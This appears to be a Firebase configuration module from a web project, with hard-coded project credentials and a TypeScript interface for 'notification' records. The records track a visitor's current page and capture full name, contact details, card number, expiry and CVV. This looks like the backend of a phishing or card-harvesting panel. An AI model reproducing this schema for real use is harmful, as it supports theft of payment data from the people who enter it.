import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

 const firebaseConfig = {
  apiKey: "AIzaSyBoVsn5FBHJAe0HiSwpUIBg2gVmG6AwT90",
  authDomain: "adxssxxx.firebaseapp.com",
  projectId: "adxssxxx",
  storageBucket: "adxssxxx.firebasestorage.app",
  messagingSenderId: "863187600210",
  appId: "1:863187600210:web:5c8f48dfa8854ea102b08b",
  measurementId: "G-QGTJSDV7ZP"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

